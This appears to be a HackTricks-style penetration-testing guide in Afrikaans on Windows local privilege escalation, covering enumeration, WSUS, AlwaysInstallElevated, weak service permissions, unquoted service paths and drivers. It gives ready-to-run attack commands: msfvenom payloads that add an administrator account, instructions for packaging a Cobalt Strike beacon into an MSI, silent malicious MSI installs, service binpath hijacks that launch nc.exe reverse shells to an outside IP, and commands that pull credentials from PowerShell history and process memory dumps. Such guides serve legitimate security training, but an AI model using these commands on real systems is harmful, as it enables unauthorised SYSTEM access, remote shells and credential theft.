# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste hulpmiddel om na Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Aanvanklike Windows-teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees asseblief die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Sekuriteitskontroles

Daar is verskeie dinge in Windows wat jou kan **verhoed om die stelsel te enumerate**, uitvoerbare lêers te laat loop of selfs jou aktiwiteite te **ontdek**. Jy moet die volgende **bladsy** **lees** en al hierdie **verdedigings** **meganismes** **enumerate** voordat jy met die privilege escalation enumeration begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Stelsel-inligting

### Weergawe-inligting enumeration

Kyk of die Windows-weergawe enige bekende kwesbaarheid het (kontroleer ook watter patches toegepas is).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe-eksploite

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwetsbaarhede te soek. Hierdie databasis bevat meer as 4,700 sekuriteitskwetsbaarhede, wat die **enorme aanvaloppervlak** toon wat 'n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_

**Lokaal met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-repos van eksploite:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Is daar enige credential/Juicy-inligting gestoor in die env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkripsie lêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word opgeteken, insluitend uitgevoerde opdragte, opdragoproepe en dele van skripte. Daar word egter nie noodwendig volledige uitvoeringsbesonderhede en uitvoerresultate vasgelê nie.

Om dit aan te skakel, volg die instruksies in die "Transcript files" afdeling van die dokumentasie en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeure uit die Powershell logs te sien, kan jy die volgende uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige aktiwiteits- en inhoudsopname van die skrip se uitvoering word vasgelê, wat verseker dat elke kodeblok gedokumenteer word terwyl dit uitgevoer word. Hierdie proses bewaar 'n omvattende ouditspoor van elke aktiwiteit, waardevol vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteite tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Aantekeninge vir die Script Block kan in die Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeure te sien, kan jy gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Skywe
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die updates nie met http**S** maar met http aangevra word nie.

Begin deur te kontroleer of die netwerk 'n nie-SSL WSUS update gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy 'n antwoord ontvang soos een van die volgende:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan, **is dit uitbuitbaar.** As die laaste register gelyk is aan 0, sal die WSUS-inskrywing geïgnoreer word.

Om hierdie kwesbaarhede te benut kan jy instrumente soos gebruik: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - dit is MiTM-weaponized exploit-skripte om 'vals' updates in nie-SSL WSUS-verkeer in te spuit.

Lees die navorsing hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies, dit is die fout wat hierdie bug uitbuit:

> As ons die mag het om ons plaaslike gebruikersproxy te wysig, en Windows Updates gebruik die proxy wat in Internet Explorer’s instellings gekonfigureer is, het ons dus die moontlikheid om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te laat loop om ons eie verkeer te onderskep en kode as 'n verhoogde gebruiker op ons asset uit te voer.
>
> Verder, aangesien die WSUS-diens die huidige gebruiker se instellings gebruik, sal dit ook die sertifikaatwinkel van daardie gebruiker gebruik. As ons 'n self-ondertekende sertifikaat vir die WSUS-hostname genereer en hierdie sertifikaat by die huidige gebruiker se sertifikaatwinkel voeg, sal ons beide HTTP- en HTTPS WSUS-verkeer kan onderskep. WSUS gebruik geen HSTS-agtige meganismes om 'n trust-on-first-use tipe validering op die sertifikaat te implementeer nie. As die aangebiedde sertifikaat deur die gebruiker vertrou word en die korrekte hostname het, sal dit deur die diens aanvaar word.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Baie enterprise agents openbaar 'n localhost IPC-oppervlak en 'n bevoorregte opdateringskanaal. As enrollment na 'n aanvaller-bediener gedwing kan word en die updater 'n rogue root CA of swak signer checks vertrou, kan 'n plaaslike gebruiker 'n kwaadwillige MSI lewer wat die SYSTEM-diens installeer. Sien 'n gegeneraliseerde tegniek (gebaseer op die Netskope stAgentSvc chain – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** kwesbaarheid bestaan in Windows **domain** omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar **LDAP signing is not enforced,** gebruikers self-regte het wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD),** te konfigureer, en die vermoë dat gebruikers rekenaars binne die domain kan skep. Dit is belangrik om daarop te let dat hierdie **vereistes** met **default settings** vervul word.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 sleutels is **geaktiveer** (waarde is **0x1**), kan gebruikers van enige voorreg `*.msi` lêers **installeer** (uitvoer) as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter session het, kan jy hierdie tegniek outomatiseer deur die module **`exploit/windows/local/always_install_elevated`** te gebruik

### PowerUP

Gebruik die `Write-UserAddMSI` command van power-up om in die huidige gids 'n Windows MSI binary te skep om privileges te escalate. Hierdie script skryf 'n vooraf-gekompileerde MSI-installer uit wat vir 'n gebruiker/groep-toevoeging vra (so jy sal GIU toegang nodig hê):
```
Write-UserAddMSI
```
Voer net die geskepte binêre uit om voorregte te eskaleer.

### MSI Wrapper

Lees hierdie handleiding om te leer hoe om 'n MSI wrapper te skep met hierdie tools. Let daarop dat jy 'n "**.bat**" lêer kan inpak as jy **net** opdragreëls wil **uitvoer**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genereer** met Cobalt Strike of Metasploit 'n **nuwe Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekboks. Kies die **Setup Wizard** projek en klik **Next**.
- Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** as ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Klik voort op **Next** totdat jy by stap 3 van 4 uitkom (kies lêers om in te sluit). Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc** projek in die **Solution Explorer** en verander in die **Properties** die **TargetPlatform** van **x86** na **x64**.
- Daar is ander eienskappe wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer legitimiteit kan gee.
- Regsklik die projek en kies **View > Custom Actions**.
- Regsklik **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe** lêer en klik **OK**. Dit sorg dat die beacon payload uitgevoer word sodra die installer loop.
- Onder die **Custom Action Properties**, verander **Run64Bit** na **True**.
- Laastens, bou dit.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` vertoon word, maak seker jy stel die platform op x64.

### MSI Installasie

Om die **installasie** van die kwaadwillige `.msi` lêer in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwetsbaarheid uit te buit, kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Detektore

### Oudit-instellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy daarop let
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — dit is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde**, wat verseker dat elke wagwoord **uniek, gerandomiseer en gereeld opgedateer** is op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig in Active Directory gestoor en kan slegs deur gebruikers met voldoende permissies via ACLs geraadpleeg word, wat hulle in staat stel om plaaslike admin-wagwoorde te sien indien gemagtig.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien aktief, word **plain-text wagwoorde in LSASS gestoor** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings deur onvertroude prosesse te **blokkeer** om sy geheue te **lees** of kode in te spuit, en sodoende die stelsel verder te beveilig.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is bekendgestel in **Windows 10**. Die doel daarvan is om die credentials wat op 'n toestel gestoor word, te beskerm teen bedreigings soos pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** word geverifieer deur die **Local Security Authority** (LSA) en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se logon-data deur 'n geregistreerde security package geverifieer word, word domain credentials vir die gebruiker gewoonlik gevestig.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumereer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waarvan jy 'n lid is interessante toestemmings het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Geprivilegieerde groepe

As jy **tot 'n geprivilegieerde groep behoort, kan jy dalk bevoegdhede eskaleer**. Lees oor geprivilegieerde groepe en hoe om dit te misbruik om bevoegdhede te eskaleer hier:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-manipulasie

**Lees meer** oor wat 'n **token** is op hierdie blad: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende blad om **meer te leer oor interessante tokens** en hoe om dit te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuismappe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Aktiewe prosesse

### Lêer- en gids-toestemmings

Eerstens, wanneer jy die prosesse lys, **kontroleer of daar wagwoorde in die command line van die proses is**.\
Kontroleer of jy 'n lopende binary kan oorskryf of skryftoestemmings op die binary-folder het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) te benut:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop — jy kan dit misbruik om escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die toestemmings van die proses se binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer permissies van die vouers van die proses se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Jy kan 'n geheue-dump van 'n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP het die **credentials in duidelike teks in geheue**, probeer om die geheue te dump en die credentials te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassings wat as SYSTEM loop kan 'n gebruiker toelaat om 'n CMD te open, of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek na "command prompt", klik op "Click to open Command Prompt"

## Dienste

Service Triggers laat Windows 'n diens begin wanneer sekere toestande voorkom (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte dienste begin deur hul triggers te aktiveer. Sien enumerasie en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Toestemmings

Jy kan **sc** gebruik om inligting oor 'n service te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binêre **accesschk** van _Sysinternals_ te hê om die vereiste privilege level vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_Stelselfout 1058 het voorgekom._\
_Die diens kan nie begin word nie, hetsy omdat dit gedeaktiveer is of omdat daar geen geaktiveerde toestelle aan hom gekoppel is nie._

Jy kan dit inskakel met
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost van SSDPSRV afhanklik is om te werk (vir XP SP1)**

**Another workaround** van hierdie probleem is om uit te voer:
```
sc.exe config usosvc start= auto
```
### **Wysig diens se binêre pad**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens het, is dit moontlik om die diens se uitvoerbare binêre te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Voorregte kan opgeëskal word deur verskeie toestemmings:

- **SERVICE_CHANGE_CONFIG**: Laat die diens se binêre lêer herkonfigureer toe.
- **WRITE_DAC**: Maak dit moontlik om toestemmings te herkonfigureer, wat daartoe kan lei dat dienskonfigurasies verander word.
- **WRITE_OWNER**: Gee toestemming om eienaarskap te verkry en toestemmings te herkonfigureer.
- **GENERIC_WRITE**: Gee ook die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Gee ook die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan die _exploit/windows/local/service_permissions_ gebruik word.

### Swak toestemmings van diens-binêre

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binêre wat deur 'n diens uitgevoer word kry met **wmic** (not in system32) en jou toestemmings nagaan met **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Diensteregister: wysig toestemmings

Jy moet nagaan of jy enige diensteregister kan wysig.\
Jy kan jou **toestemmings** oor 'n **diensteregister** **kontroleer** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl` toestemmings het. Indien wel, kan die binary wat deur die diens uitgevoer word, gewysig word.

Om die Path van die uitgevoerde binary te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dienste-register AppendData/AddSubdirectory toestemmings

As jy hierdie toestemming oor 'n register het, beteken dit dat **jy subregisters van hierdie een kan skep**. In die geval van Windows services is dit **genoeg om arbitrêre kode uit te voer:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Dienspade sonder aanhalingstekens

As die pad na 'n uitvoerbare lêer nie tussen aanhalingstekens is nie, sal Windows probeer om elke gedeelte voor 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle dienspaaie wat nie tussen aanhalingstekens is nie, uitgesluit dié wat aan ingeboude Windows-dienste behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan opspoor en uitbuit** hierdie kwesbaarheid met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n service binary met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat uitgevoer moet word as 'n diens misluk. Hierdie funksie kan gekonfigureer word om na 'n binary te wys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede is beskikbaar in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Toepassings

### Geïnstalleerde toepassings

Kontroleer die **toestemmings van die binaries** (miskien kan jy een oorskryf en privilege escalation bewerkstellig) en van die **lêergidse** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryf toestemmings

Kyk of jy 'n config file kan wysig om 'n spesiale lêer te lees, of 'n binary kan wysig wat deur 'n Administrator account (schedtasks) uitgevoer gaan word.

Een manier om swak gids-/lêertoestemmings in die stelsel te vind is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Voer by opstart uit

**Kyk of jy 'n registry of binary kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Kyk vir moontlike **derdeparty vreemde/kwetsbare** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n arbitrary kernel read/write primitive blootstel (algemeen in swak ontwerpte IOCTL handlers), kan jy eskaleer deur 'n SYSTEM token direk uit kernel memory te steel. Sien die stapsgewyse tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

